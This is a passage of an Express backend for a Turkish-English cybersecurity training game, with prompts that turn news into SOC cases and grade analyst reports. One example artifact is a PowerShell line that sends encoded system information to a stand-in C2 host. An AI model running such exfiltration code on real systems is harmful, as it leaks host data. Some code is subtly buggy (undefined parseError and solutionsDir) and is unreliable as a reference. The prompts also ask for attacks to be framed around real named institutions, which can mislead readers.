    * **Example for an internal IP:** "192.168.1.1 is a private IP address, likely a gateway or internal server within your network. It's probably part of the affected environment, not the source of the attack."
    * **Example for a public IP:** "172.217.160.142 belongs to Google's IP range. The attacker might be using it for C2 communication or data exfiltration. You should investigate which domains are associated with this IP and how it connects to our case."
    * **After guessing, ALWAYS guide the user back to the available evidence.** For instance: "To confirm this, you should check the DNS logs (artifact-03) to see what domains this IP communicates with."

4.  **ACKNOWLEDGE AND REWARD:** If the user makes a correct deduction, praise it and ask a follow-up question that pushes them deeper.

5.  **ESCALATE HINTS:** If the user is stuck ("bilmiyorum", "yardım et"), provide a new, slightly more direct hint.

6.  **MAINTAIN CONTEXT:** Use the conversation history to understand what the user already knows.

7.  **LANGUAGE:** Your response language MUST be ${language === 'tr' ? 'Turkish' : 'English'}.

8.  **BE CONCISE:** Your response must ONLY be the clue text. No greetings or extra phrases.
`;

        const providers = ['gemini', 'openai', 'deepseek'];
        const preferredProvider = userSettings.provider || 'gemini';
        const provider_order = [preferredProvider, ...providers.filter(p => p !== preferredProvider)];

        let mentorReply = null;

        for (const provider of provider_order) {
            const apiKey = userSettings[`${provider}ApiKey`];
            if (!apiKey) {
                console.log(`Mergen Atlıyor: ${provider} için API anahtarı yok.`);
                continue;
            }

            console.log(`Mergen Deniyor: ${provider} ile yanıt oluşturuluyor...`);

            try {
                let historyForAI = messages.map(msg => ({
                    role: msg.sender === 'user' ? 'user' : 'model',
                    parts: [{ text: msg.text }]
                }));

                if (historyForAI.length > 0 && historyForAI[0].role === 'model') {
                    historyForAI = historyForAI.slice(1);
                }

                if (provider === 'gemini') {
                    const genAI = new GoogleGenerativeAI(apiKey);
                    const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash-latest", systemInstruction });
                    const chat = model.startChat({ history: historyForAI.slice(0, -1) });
                    const lastUserMessage = historyForAI[historyForAI.length - 1].parts[0].text;
                    const result = await chat.sendMessage(lastUserMessage);
                    mentorReply = result.response.text();
                } else { // OpenAI ve DeepSeek
                    const baseURL = provider === 'deepseek' ? 'https://api.deepseek.com/v1' : null;
                    const openai = new OpenAI({ apiKey, ...(baseURL && { baseURL }) });
                    const modelName = provider === 'deepseek' ? 'deepseek-chat' : 'gpt-4o-mini';
                    
                    const response = await openai.chat.completions.create({
                        model: modelName,
                        messages: [{ role: 'system', content: systemInstruction }, ...historyForAI.map(h => ({ role: h.role, content: h.parts[0].text }))]
                    });
                    mentorReply = response.choices[0].message.content;
                }

                if (mentorReply) {
                    break; // Başarılı yanıt alındı, döngüden çık
                }
            } catch (error) {
                console.error(`Mergen Hatası (${provider}):`, error.message);
                // Hata varsa bir sonraki sağlayıcıyı denemek için devam et
            }
        }

        if (!mentorReply) {
            throw new Error("Tüm AI sağlayıcıları ile Mergen yanıtı oluşturma işlemi başarısız oldu.");
        }

        res.json({ reply: mentorReply });
        // --- YEDEKLEME MANTIĞI SONU ---

    } catch (error) {
        console.error("AI Mentor genel hatası:", error);
        res.status(500).json({ reply: "Mergen ile iletişim kurulamadı. Lütfen API anahtarlarınızı kontrol edin veya daha sonra tekrar deneyin." });
    }
});

// --- YENİ ENDPOINT: AI İLE YENİ VAKA OLUŞTURMA ---
app.post('/api/cases/create', async (req, res) => {
    const { articleText, userSettings, difficulty, caseType, anonymousUserId } = req.body;

    if (!caseType || (caseType === 'private' && !anonymousUserId)) {
        return res.status(400).json({ error: 'Vaka türü veya özel vaka için kullanıcı kimliği eksik.' });
    }

    if (!articleText || !userSettings || !userSettings.provider || !userSettings[`${userSettings.provider}ApiKey`] || !difficulty) {
        return res.status(400).json({ error: 'Makale metni, kullanıcı ayarları ve zorluk seviyesi gereklidir.' });
    }

    const apiKey = userSettings[`${userSettings.provider}ApiKey`];

    // 2. ZORLUK SEVİYESİNE GÖRE PROMPT'U DİNAMİK OLARAK AYARLIYORUZ
    const difficultyInstructions = {
        beginner: "İpuçları, siber güvenliğe yeni başlayan birinin anlayacağı şekilde, en temel kavramlara (örn: Phishing nedir? Malware nasıl bulaşır?) odaklanmalıdır. Teknik jargon minimumda tutulmalıdır.",
        intermediate: "İpuçları, haberdeki spesifik teknoloji ve yöntemlere (örn: Log4j zafiyetinin nasıl sömürüldüğü, kullanılan zararlı yazılımın adı, C2 sunucu iletişimi) odaklanmalıdır. Orta seviye teknik detaylar içermelidir.",
        advanced: "İpuçları, bir SOC analistinin veya olay müdahale uzmanının düşüneceği şekilde, olayın daha derin etkilerine, TTP'lere (Taktik, Teknik, Prosedürler), olası atfedilmeye (attribution) ve zincirin zayıf halkalarına odaklanmalıdır. Yüksek seviye teknik analiz ve çıkarım gerektirmelidir."
    };

    // --- PROMPT ENGINEERING: DÜZELTİLMİŞ HALİ ---
    const promptForAI = `

# GÖREVİN
Sen, siber güvenlik haberlerini analiz edip bu haberlerden "Cyber Detective" adında interaktif bir öğrenme senaryosu (vaka) üreten bir yapay zeka asistanısın. Görevin, verilen bir haber metnini, bir SOC analistinin aşama aşama çözeceği, gizemli ve ilgi çekici bir anlatıma sahip bir "katil kim?" senaryosuna dönüştürmektir.

# HİKAYELEŞTİRME KURALI
Verilen haber metnindeki saldırı türünü, hedefi ve sektörü analiz et. Bu analize dayanarak, vakayı gerçek dünyadan bilinen bir kurum (örneğin büyük bir teknoloji şirketi, bir devlet bankası, bir enerji santrali vb.) veya kurgusal ama gerçekçi bir şirket üzerinden hikayeleştir. Saldırının bu kurumun başına gelmiş gibi anlatılması, senaryoyu daha inandırıcı kılacaktır.

# ZORLUK SEVİYESİ
Bu vaka "${difficulty}" seviyesinde olmalıdır. İpuçlarını bu seviyeye göre ayarla.

# KESİN KURALLAR
1.  **ÇIKTI SADECE JSON OLMALI:** Yanıtın SADECE geçerli bir JSON nesnesi içermelidir. Öncesinde veya sonrasında \`\`\`json \`\`\` veya herhangi bir açıklama metni OLMAMALIDIR.
2.  **DİL:** Tüm metinler (title, news_article_text, hints) hem Türkçe (tr) hem de İngilizce (en) olarak sağlanmalıdır.
3.  **BRİFİNG SENARYOSU (EN KRİTİK KURAL):** "news_article_text" alanı için, haber metnindeki olayın ciddiyetine ve türüne uygun, yaratıcı ve gerçekçi bir SIEM uyarısı senaryosu oluştur. ŞABLONU BİREBİR KOPYALAMA, şablonun formatını ve ruhunu takip ederek kendi metnini oluştur.
    * **To:** Alanı için analistin seviyesini (örn: "SOC Level 1 Analyst", "Senior Incident Responder") olayın karmaşıklığına göre belirle.
    * **From:** Alanı için uyarının kaynağını (örn: "SIEM", "EDR Alert System", "Data Loss Prevention System") olayın türüne göre belirle.
    * **Subject:** Alanı için aciliyet belirten ve olayı özetleyen bir başlık yaz.
    * **Uyarı Detayı, Kaynak, Not:** Bu kısımları haber metninden çıkardığın bilgilerle, bir analistin ihtiyaç duyacağı şekilde doldur. Olayın çözümünü ASLA açıklama.
    * **Göreviniz (Your Task) - ZORUNLU BÖLÜM: Brifingin sonuna mutlaka Göreviniz (Your Task) adında yeni bir bölüm ekle. Bu bölümde, haber metnine göre analistin birincil hedeflerini (örneğin: "etkilenen kullanıcıları tespit etmek", "saldırganın altyapısını haritalandırmak", "yayılmayı önlemek için acil eylem planı sunmak") net bir şekilde tanımlayan 1-2 cümlelik bir görev tanımı yaz.
    * **Log Detaylandırması: Not bölümünün sonuna veya Göreviniz bölümünün bir parçası olarak, analistin incelemesi için hangi temel log kaynaklarının (örn: "Proxy", "DNS", "Azure AD Sign-in logları") mevcut olduğunu belirten bir cümle ekle.
    * Her bölümü kalın (markdown **...**) yap ve aralarına birer boş satır (\n\n) ekle.

4.  **İPUÇLARI (clues):** Haberdeki teknik detayları, brifingde verilmeyen ek "kanıtlar" olarak 5-7 adet ipucuna dönüştür.
5.  **KONU ÖNERİLERİ (related_concepts):** Haber metnini analiz et ve bu vakayı çözmek için bilinmesi gereken 3 ila 5 adet temel siber güvenlik kavramını belirle. Bu kavramları, JSON çıktısındaki "related_concepts" dizisine ekle. Örnekler: "Phishing", "Command Injection", "Base64 Encoding", "Malware-as-a-Service".
6.  **ZORLUK SEVİYESİ KAYDI:** JSON çıktısının ana objesine, sana verilen "${difficulty}" değerini içeren bir "difficulty" anahtarı ekle. Değer "beginner", "intermediate" veya "advanced" olmalıdır.
7.  **BAĞLANTILI VE %100 BAĞLAMSAL KANIT ÜRETİMİ (artifacts):** Haber metnindeki teknik özü damıtarak, bir analistin olayı çözmek için bir araya getirmesi gereken, birbiriyle MANTIKSAL BİR ZİNCİR oluşturan **en az 5 adet** "kanıt" üret.
    * **İÇERİK ZORUNLULUĞU (EN KRİTİK KURAL):** Kanıtların içeriğini (%100) SADECE SANA VERİLEN HABER METNİNDEN üretmelisin. Aşağıdaki örnekler SADECE FORMAT İÇİNDİR. ÖRNEKLERDEKİ VERİLERİ (domain adı, IP, hash vb.) ASLA KULLANMA. Kendi verilerini haber metninden türet.
    * **"ALTIN İPUCU" ZORUNLULUĞU:** Kanıtlar arasında bir "altın ipucu" olmalıdır. Bu, bir dosya hash'i, belirli bir IP adresi, bir alan adı veya bir kullanıcı adı gibi, **en az iki farklı kanıtta** tekrar eden ve kullanıcının olayın parçalarını birleştirmesini sağlayan kilit bir veri parçasıdır.
    * **YORUM YASAĞI:** "content" alanına, kanıtın neden şüpheli olduğunu açıklayan veya ipucu veren HİÇBİR yorum ekleme. Sadece ham veriyi sun.
    * **MAKSİMUM REALİZM:** Dış IP adresleri için 192.168.x.x gibi özel ağ adresleri KULLANMA; bunun yerine 185.x.x.x gibi bilinen zararlı aktivite bloklarından kurgusal IP'ler kullan.
    * **HAM VERİ ve DETAY:** Her zaman HAM VERİNİN kendisini, çok satırlı (\`\\n\` kullanarak) ve detaylı bir şekilde yaz.
    * **Kanıt Türleri ve Detaylı Örnekler (YORUMSUZ):**
        * **type: "log":** Gerçek bir Windows Olay Görüntüleyicisi çıktısı gibi detaylar ekle.
            \`content: { "tr": "Log Adı: Security\\nKaynak: Microsoft Windows security auditing.\\nOlay ID: 4625\\nSeviye: Hata\\n---\\nOturum Açma Başarısız.\\n\\nHesap Adı: administrator\\nKaynak Ağ Adresi: 185.125.190.23\\nKaynak Port: 58172\\n\\nHata Kodu: 0xC000006D", "en": "Log Name: Security\\nSource: Microsoft Windows security auditing.\\nEvent ID: 4625\\nLevel: Error\\n---\\nAn account failed to log on.\\n\\nAccount Name: administrator\\nSource Network Address: 185.125.190.23\\nSource Port: 58172\\n\\nFailure Code: 0xC000006D" }\`
        * **type: "report" (WHOIS):** Raporu, "Updated Date", "Registrar" ve "Name Servers" gibi ek alanlarla zenginleştir.
            \`content: { "tr": "Domain: malicious-c2.com\\nRegistrar: NameCheap, Inc.\\nCreation Date: 2025-08-29T10:00:00Z\\nUpdated Date: 2025-08-29T10:00:00Z\\nName Servers: ns1.private-dns.com", "en": "..." }\`
        * **type: "file_analysis":** Dosya analiz sonucunu daha detaylı ver.
            \`content: { "tr": "Dosya Adı: update.exe\\nMD5 Hash: e4d909c290d0fb1ca068ffaddf22cbd0\\nTespit Oranı: 58/70\\nİmza: Trojan:Win32/Wacatac.B!ml\\nİlk Görülme: 2025-08-30", "en": "File Name: update.exe\\nMD5 Hash: e4d909c290d0fb1ca068ffaddf22cbd0\\nDetection Ratio: 58/70\\nSignature: Trojan:Win32/Wacatac.B!ml\\nFirst Seen: 2025-08-30" }\`
        * **type: "code":** Kodu, sanki bir zararlı yazılım analisti tarafından okunabilir hale getirilmiş gibi sun.
            \`content: { "tr": "# C2 sunucusuna sistem bilgilerini gönderen PowerShell betiği\\n$c2_url = \\"http://malicious-c2.com/gate.php\\"\\n$sys_info = Get-ComputerInfo | Out-String\\n$encoded_info = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($sys_info))\\nInvoke-RestMethod -Uri ($c2_url + \\"?data=\\" + $encoded_info) -Method Post", "en": "..." }\`
        * **type: "dns_log":** Bir DNS sorgu kaydını göster.
            \`content: { "tr": "Tarih: 2025-09-01 14:25:10 | İstemci: 10.1.5.122 (DC01) | Sorgu: A | Alan Adı: malicious-c2.com | Yanıt: 185.125.190.23", "en": "Date: 2025-09-01 14:25:10 | Client: 10.1.5.122 (DC01) | Query: A | Domain: malicious-c2.com | Response: 185.125.190.23" }\`

# İSTENEN JSON ÇIKTI YAPISI
\`\`\`json
{
  "title": {
    "tr": "TÜRKÇE VAKA BAŞLIĞI",
    "en": "İNGİLİZCE VAKA BAŞLIĞI"
  },
  "difficulty": "beginner",
  "news_article_text": {
    "tr": "TÜRKÇE BRİFİNG SENARYOSU (Kullanıcıyı role sokan, olayı başlatan gizemli metin)",
    "en": "İNGİLİZCE BRİFİNG SENARYOSU"
  },
  "related_concepts": [
    "İlgili Kavram 1",
    "İlgili Kavram 2",
    "İlgili Kavram 3",
    "İlgili Kavram 4",
    "İlgili Kavram 5",
  ],
  "clues": {
    "initial_access": {
      "keywords": ["ilk erişim", "sızma", "giriş", "access", "entry"],
      "hint": { "tr": "TÜRKÇE İPUCU 1 (Kanıt 1)", "en": "İNGİLİZCE İPUCU 1 (Evidence 1)" }
    },
    "defense_evasion": {
      "keywords": ["gizlenme", "tespitten kaçınma", "antivirüs", "evasion", "av"],
      "hint": { "tr": "TÜRKÇE İPUCU 2 (Kanıt 2)", "en": "İNGİLİZCE İPUCU 2 (Evidence 2)" }
    }
  }
  "artifacts": [
    {
      "id": "artifact-01",
      "type": "report",
      "title": { "tr": "...", "en": "..." },
      "content": { "tr": "...", "en": "..." }
    }
  ]
}
\`\`\`

# VAKA OLUŞTURULACAK HABER METNİ
---
${articleText}
---
`;

    const providers = ['gemini', 'openai', 'deepseek'];
    // Kullanıcının tercih ettiği sağlayıcıyı listenin başına al
    const preferredProvider = userSettings.provider || 'gemini';
    const provider_order = [preferredProvider, ...providers.filter(p => p !== preferredProvider)];

    let result = null;

    for (const provider of provider_order) {
        const apiKey = userSettings[`${provider}ApiKey`];
        if (!apiKey) {
            console.log(`Atlanıyor: ${provider} için API anahtarı bulunamadı.`);
            continue; // Bu sağlayıcı için anahtar yoksa, bir sonrakine geç
        }

        const newCaseId = `case-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;

        try {
            if (provider === 'gemini') {
                const genAI = new GoogleGenerativeAI(apiKey);
                const model = genAI.getGenerativeModel({ 
                    model: "gemini-1.5-flash-latest",
                    generationConfig: { responseMimeType: "application/json" }
                });
                const genResult = await model.generateContent(promptForAI);
                result = await genResult.response;
                
            } else { // OpenAI ve DeepSeek için
                const baseURL = provider === 'deepseek' ? 'https://api.deepseek.com/v1' : null;
                const openai = new OpenAI({ apiKey, ...(baseURL && { baseURL }) });
                const modelName = provider === 'deepseek' ? 'deepseek-chat' : 'gpt-4o-mini';
                
                const response = await openai.chat.completions.create({
                    model: modelName,
                    messages: [
                        // --- DÜZELTME: DAHA AGRESİF SİSTEM MESAJI ---
                        { role: 'system', content: "You are an API that ONLY returns valid, raw JSON. Your entire response must start with '{' and end with '}'. Do not include markdown like ```json or any other explanatory text before or after the JSON object." },
                        { role: 'user', content: promptForAI }
                    ],
                    response_format: { type: "json_object" },
                });
                result = { text: () => response.choices[0].message.content };
            }
            
            if (result) {
                console.log(`Başarılı: Vaka ${provider} ile oluşturuldu.`);
                break; // Başarılı olursak döngüden çık
            }
        } catch (error) {
            console.error(`${provider} ile vaka oluşturma hatası:`, error.message);
            // Eğer kota hatası ise, bir sonrakini dene. Değilse, döngü devam edecek.
        }
    }

    if (!result) {
        return res.status(500).json({ success: false, error: "Tüm AI sağlayıcıları ile vaka oluşturma işlemi başarısız oldu. Lütfen API anahtarlarınızı kontrol edin." });
    }
    
    const newCaseId = `case-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
    let generatedText = ''; 

    try {
        generatedText = result.text(); 
        
        const startIndex = generatedText.indexOf('{');
        const endIndex = generatedText.lastIndexOf('}');
        
        if (startIndex === -1 || endIndex === -1) {
            console.error("AI Yanıtı (Hatalı):", generatedText);
            throw new Error("AI yanıtında geçerli bir JSON objesi bulunamadı.");
        }

        const jsonString = generatedText.substring(startIndex, endIndex + 1);
        const newCaseData = JSON.parse(jsonString);

        let saveDirectory;
        if (caseType === 'private') {
            const safeUserId = path.basename(anonymousUserId);
            saveDirectory = path.join(casesDirectory, 'private', safeUserId); // YOL GÜNCELLENDİ
        } else {
            saveDirectory = path.join(casesDirectory, 'common'); // YOL GÜNCELLENDİ
        }

        if (!fs.existsSync(saveDirectory)) {
            fs.mkdirSync(saveDirectory, { recursive: true });
        }

        const newCaseFilePath = path.join(saveDirectory, `${newCaseId}.json`);
        await fs.promises.writeFile(newCaseFilePath, JSON.stringify(newCaseData, null, 2));
        res.json({ success: true, newCaseId: newCaseId });
    } catch (error) {
        console.error("====================== JSON PARSE HATASI ======================");
        console.error("Hata Mesajı:", parseError.message);
        console.error(`Oluşturulan VAKA ID: ${newCaseId}`);
        console.error("--- AI'dan Gelen Ham Yanıt (HATANIN KAYNAĞI) ---");
        console.error(generatedText);
        console.error("==============================================================");
        res.status(500).json({ success: false, error: "AI'dan gelen yanıt geçerli bir JSON formatında değil. Sunucu konsolunu kontrol edin." });
    }
});

app.post('/api/cases/:caseId/evaluate', async (req, res) => {
    // 1. Gerekli verileri request body'sinden al
    const { report, userSettings, language, anonymousUserId } = req.body;
    const { caseId } = req.params;

    // Gerekli verilerin varlığını kontrol et
    if (!report || !userSettings || !language || !anonymousUserId || !caseId) {
        return res.status(400).json({ error: 'Eksik parametreler. Rapor, kullanıcı ayarları, dil, kullanıcı kimliği ve vaka kimliği gereklidir.' });
    }

    try {
        const safeCaseId = path.basename(caseId);
        const safeUserId = path.basename(anonymousUserId);

        // 2. Değerlendirilecek vaka dosyasını hem özel hem de ortak klasörlerde ara
        //    Doğru dosya yolu olan 'casesDirectory' kullanılıyor.
        let caseFilePath = null;
        const privatePath = path.join(casesDirectory, 'private', safeUserId, `${safeCaseId}.json`);
        const commonPath = path.join(casesDirectory, 'common', `${safeCaseId}.json`);

        if (fs.existsSync(privatePath)) {
            caseFilePath = privatePath;
        } else if (fs.existsSync(commonPath)) {
            caseFilePath = commonPath;
        }

        // Vaka dosyası bulunamazsa 404 hatası döndür
        if (!caseFilePath) {
            console.error(`Değerlendirilecek vaka bulunamadı: ${safeCaseId}`);
            return res.status(404).json({ error: 'Değerlendirilecek vaka bulunamadı.' });
        }
        
        const caseFileContent = await fs.promises.readFile(caseFilePath, 'utf8');
        const caseData = JSON.parse(caseFileContent);
        const groundTruth = caseData.news_article_text[language]; // Vakanın asıl çözümü

        // 3. Kullanıcının geçmiş çözümlerinden geri bildirimleri topla
        //    Doğru dosya yolu olan 'solutionsDirectory' kullanılıyor.
        let previousFeedbacks = "Analistin çözdüğü ilk vaka, geçmiş geri bildirim bulunmuyor.";
        if (fs.existsSync(solutionsDirectory)) {
            const allSolutionFiles = await fs.promises.readdir(solutionsDirectory);
            const userSolutionFiles = allSolutionFiles.filter(file => file.includes(safeUserId));

            if (userSolutionFiles.length > 0) {
                const feedbackPromises = userSolutionFiles.map(async (file) => {
                    const filePath = path.join(solutionsDirectory, file);
                    const fileContent = await fs.promises.readFile(filePath, 'utf8');
                    const solutionData = JSON.parse(fileContent);
                    const evaluation = solutionData.aiEvaluation || "";
                    const missedPointsMatch = evaluation.match(/### 🤔 Gözden Kaçan Noktalar([\s\S]*?)###/);
                    const recommendationsMatch = evaluation.match(/### 💡 Genel Değerlendirme ve Tavsiyeler([\s\S]*)/);
                    let feedback = "";
                    if(missedPointsMatch) feedback += missedPointsMatch[1].trim();
                    if(recommendationsMatch) feedback += "\n" + recommendationsMatch[1].trim();
                    return feedback;
                });
                const feedbacks = await Promise.all(feedbackPromises);
                const combinedFeedbacks = feedbacks.join('\n\n---\n\n').trim();
                if(combinedFeedbacks) {
                    previousFeedbacks = combinedFeedbacks;
                }
            }
        }

        // 4. AI Değerlendirmesi için Prompt'u oluştur
        const evaluationPrompt = `
# GÖREVİN
Sen, tecrübeli, empatik ve gelişim odaklı bir SOC (Güvenlik Operasyon Merkezi) Yöneticisisin. Görevin, ekibindeki bir junior analistin siber saldırı vakası hakkındaki raporunu, analistin GEÇMİŞ PERFORMANSINI da dikkate alarak kişiselleştirilmiş bir şekilde değerlendirmektir.
# YENİ VE EN KRİTİK KURAL: GELİŞİM TAKİBİ
Sana, bu analistin daha önceki vakalarda yaptığı hatalar ve aldığı tavsiyeler "GEÇMİŞ GERİ BİLDİRİMLER" başlığı altında sunuluyor. Değerlendirmeni yaparken BU GEÇMİŞİ MUTLAKA GÖZ ÖNÜNDE BULUNDUR.
* Eğer analist, daha önce gözden kaçırdığı bir noktayı bu sefer doğru tespit ettiyse, bunu MUTLAKA FARK ET ve "Gelişimini görmek harika, geçen sefer gözden kaçırdığın X konusunu bu sefer başarıyla tespit etmişsin." gibi bir cümleyle onu özellikle tebrik et.
* Eğer analist, daha önce de yaptığı bir hatayı TEKRAR EDİYORSA, bunu nazikçe belirt. Örneğin: "Daha önceki analizimizde de konuştuğumuz gibi, tehdit istihbaratı entegrasyonu konusuna biraz daha odaklanmamız gerekiyor gibi görünüyor."
* Tavsiyelerini, analistin sürekli eksik kaldığı alanlara yönelik daha spesifik hale getir.
# DEĞERLENDİRME KRİTERLERİ
(Diğer tüm kriterler, dil ve format kuralları aynı kalacak...)
---
# GEÇMİŞ GERİ BİLDİRİMLER (Analistin Önceki Hataları ve Tavsiyeler)
${previousFeedbacks}
---
# ZEMİN GERÇEĞİ (Olayın Tam Çözümü)
${groundTruth}
---
# ANALİST RAPORU (Mevcut Değerlendirme)
**İlk Erişim Vektörü:** ${report.initial_access}
**Kullanılan Araçlar:** ${report.key_tools}
**Saldırının Etkisi:** ${report.impact}
**Özet:** ${report.summary}
---
`;

        // 5. AI Sağlayıcıları ile Değerlendirmeyi Almaya Çalış
        let evaluationText = '';
        let success = false;
        const providerPriority = [
            userSettings.provider, 
            ...['gemini', 'openai', 'deepseek'].filter(p => p !== userSettings.provider)
        ];

        for (const provider of providerPriority) {
            const apiKey = userSettings[`${provider}ApiKey`];
            if (!apiKey) continue;

            try {
                console.log(`Değerlendirme için ${provider} deneniyor...`);
                if (provider === 'gemini') {
                    const genAI = new GoogleGenerativeAI(apiKey);
                    const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash-latest" });
                    const result = await model.generateContent(evaluationPrompt);
                    evaluationText = await result.response.text();
                } else {
                    const baseURL = provider === 'deepseek' ? 'https://api.deepseek.com/v1' : null;
                    const openai = new OpenAI({ apiKey, ...(baseURL && { baseURL }) });
                    const modelName = provider === 'deepseek' ? 'deepseek-chat' : 'gpt-4o-mini';
                    const response = await openai.chat.completions.create({
                        model: modelName,
                        messages: [{ role: 'user', content: evaluationPrompt }]
                    });
                    evaluationText = response.choices[0].message.content;
                }
                success = true;
                console.log(`${provider} ile değerlendirme başarılı.`);
                break;
            } catch (err) {
                console.error(`${provider} ile değerlendirme hatası:`, err.message);
            }
        }

        if (!success) {
            throw new Error("Tüm AI sağlayıcıları denendi ancak değerlendirme alınamadı.");
        }

        // 6. Sonucu JSON dosyasına kaydet
        //    Doğru dosya yolu olan 'solutionsDirectory' kullanılıyor.
        const solutionData = {
            caseId: safeCaseId,
            anonymousUserId: safeUserId,
            userReport: report,
            aiEvaluation: evaluationText,
            solvedAt: new Date().toISOString()
        };
        const solutionFilename = `solution-${safeCaseId}-${safeUserId}.json`;
        const solutionFilePath = path.join(solutionsDirectory, solutionFilename);
        await fs.promises.writeFile(solutionFilePath, JSON.stringify(solutionData, null, 2));
        
        console.log(`Çözüm başarıyla kaydedildi: ${solutionFilename}`);
        
        // 7. Başarılı yanıtı frontend'e gönder
        res.json({ evaluation: evaluationText });

    } catch (error) {
        console.error("Vaka değerlendirme genel hatası:", error);
        res.status(500).json({ error: 'Değerlendirme sırasında bir sunucu hatası oluştu.' });
    }
});

app.delete('/api/cases/:caseId', async (req, res) => {
    const { caseId } = req.params;
    // Silme işlemi için kullanıcı kimliğini de almamız gerekiyor
    const { anonymousUserId } = req.query; 

    const safeCaseId = path.basename(caseId);
    const fileName = `${safeCaseId}.json`;

    // Dosyanın bulunabileceği olası yolları bir diziye ekliyoruz
    const possiblePaths = [];

    // 1. Olası konum: Kullanıcının kendi özel klasörü
    if (anonymousUserId) {
        const safeUserId = path.basename(anonymousUserId);
        possiblePaths.push(path.join(casesDirectory, 'private', safeUserId, fileName)); // YOL GÜNCELLENDİ
    }
    possiblePaths.push(path.join(casesDirectory, 'common', fileName)); 

    let filePathToDelete = null;

    // Olası yolları sırayla kontrol et
    for (const filePath of possiblePaths) {
        if (fs.existsSync(filePath)) {
            filePathToDelete = filePath;
            break; // Silinecek dosya bulundu, döngüden çık
        }
    }

    if (!filePathToDelete) {
        return res.status(404).json({ success: false, message: 'Silinecek vaka bulunamadı.' });
    }

    try {
        await fs.promises.unlink(filePathToDelete);
        console.log(`Vaka başarıyla silindi: ${filePathToDelete}`);
        res.status(200).json({ success: true, message: 'Vaka başarıyla silindi.' });
    } catch (err) {
        console.error("Vaka silinirken hata oluştu:", err);
        return res.status(500).json({ success: false, message: 'Vaka silinirken bir sunucu hatası oluştu.' });
    }
});

app.post('/api/cases/:caseId/rate', async (req, res) => {
    const { caseId } = req.params;
    const { anonymousUserId, rating } = req.body;

    if (!anonymousUserId || !rating || rating < 1 || rating > 10) {
        return res.status(400).json({ success: false, message: 'Geçersiz istek. Kullanıcı kimliği ve 1-10 arası bir puan gereklidir.' });
    }

    const safeCaseId = path.basename(caseId);
    // Oylama sadece ortak vakalar için geçerlidir.
    const caseFilePath = path.join(casesDirectory, 'common', `${safeCaseId}.json`);

    if (!fs.existsSync(caseFilePath)) {
        return res.status(404).json({ success: false, message: 'Oylanacak vaka bulunamadı veya bu bir ortak vaka değil.' });
    }

    try {
        const fileContent = await fs.promises.readFile(caseFilePath, 'utf8');
        const caseData = JSON.parse(fileContent);

        // 'ratings' dizisi yoksa oluştur.
        if (!caseData.ratings) {
            caseData.ratings = [];
        }

        // Kullanıcının daha önceki oyunu bul.
        const existingRatingIndex = caseData.ratings.findIndex(r => r.userId === anonymousUserId);

        if (existingRatingIndex > -1) {
            // Oy zaten varsa, güncelle.
            caseData.ratings[existingRatingIndex].rating = rating;
        } else {
            // Oy yoksa, yeni bir oy ekle.
            caseData.ratings.push({ userId: anonymousUserId, rating: rating });
        }

        // Yeni veriyi dosyaya geri yaz.
        await fs.promises.writeFile(caseFilePath, JSON.stringify(caseData, null, 2));

        // Güncel ortalamayı ve oy sayısını hesapla.
        const totalRating = caseData.ratings.reduce((sum, r) => sum + r.rating, 0);
        const averageRating = totalRating / caseData.ratings.length;

        res.status(200).json({
            success: true,
            message: 'Oyunuz başarıyla kaydedildi.',
            averageRating: averageRating.toFixed(1),
            ratingCount: caseData.ratings.length
        });

    } catch (error) {
        console.error(`Vaka oylanırken hata oluştu (${safeCaseId}):`, error);
        res.status(500).json({ success: false, message: 'Oylama sırasında bir sunucu hatası oluştu.' });
    }
});

app.delete('/api/solutions/:anonymousUserId', async (req, res) => {
    const { anonymousUserId } = req.params;
    const safeUserId = path.basename(anonymousUserId);
    // Bu endpoint zaten en başta tanımlanan 'solutionsDirectory' değişkenini kullanıyor,
    // bu yüzden otomatik olarak doğru çalışacaktır.
    if (!fs.existsSync(solutionsDirectory)) {
        return res.status(200).json({ success: true, message: 'Silinecek bir çözüm geçmişi bulunmuyor.' });
    }

    try {
        const allFiles = await fs.promises.readdir(solutionsDir);
        const userFiles = allFiles.filter(file => file.includes(safeUserId));

        if (userFiles.length === 0) {
            return res.status(200).json({ success: true, message: 'Bu kullanıcıya ait silinecek bir çözüm geçmişi bulunmuyor.' });
        }

        const deletePromises = userFiles.map(file => 
            fs.promises.unlink(path.join(solutionsDir, file))
        );
        
        await Promise.all(deletePromises);

        console.log(`${userFiles.length} adet çözüm dosyası silindi (Kullanıcı: ${safeUserId})`);
        res.status(200).json({ success: true, message: `${userFiles.length} adet vaka çözüm kaydı başarıyla silindi.` });

    } catch (error) {
        console.error(`Çözüm geçmişi silinirken hata oluştu (Kullanıcı: ${safeUserId}):`, error);
        res.status(500).json({ success: false, message: 'Sunucu hatası nedeniyle geçmiş silinemedi.' });
    }
});

// --- YENİ YARDIMCI SOHBET FONKSİYONLARI ---

/**
 * Gemini modeli ile bir sohbet oturumu başlatır ve yanıtı stream eder.
 */
async function streamChatGeminiResponse(apiKey, messages, res) {
    const genAI = new GoogleGenerativeAI(apiKey);

    // 1. DÜZELTME: Sistem talimatını ayrı bir değişken olarak tanımlıyoruz.
    const systemInstructionText = `You are "Mergen", an expert Cybersecurity Mentor. Your student is from Turkey and is learning to improve their technical English and cybersecurity skills. 
    - Your tone must be professional, encouraging, and pedagogical. 
    - Explain complex topics with real-world examples.
    - You must primarily respond in the language the user uses. If they ask in Turkish, answer in Turkish. If they ask in English, answer in English.
    - You can ask follow-up questions to gauge their understanding.`;

    // 2. DÜZELTME: Modeli başlatırken, sistem talimatını özel 'systemInstruction' parametresi ile veriyoruz.
    const model = genAI.getGenerativeModel({ 
        model: "gemini-1.5-flash-latest",
        systemInstruction: systemInstructionText
    });

    // Gemini API'si, 'user' ve 'model' rollerinin sırayla olmasını bekler.
    const chatHistory = messages.map(msg => ({
        role: msg.role === 'user' ? 'user' : 'model',
        parts: [{ text: msg.content }]
    }));

    // 3. DÜZELTME: Sohbeti başlatırken artık geçmişe sistem talimatını dahil etmiyoruz.
    const chat = model.startChat({
        history: chatHistory.slice(0, -1) // Son mesaj hariç tüm geçmiş
    });

    const lastMessage = chatHistory[chatHistory.length - 1].parts[0].text;
    const result = await chat.sendMessageStream(lastMessage);

    for await (const chunk of result.stream) {
        res.write(chunk.text());
    }
    res.end();
}

/**
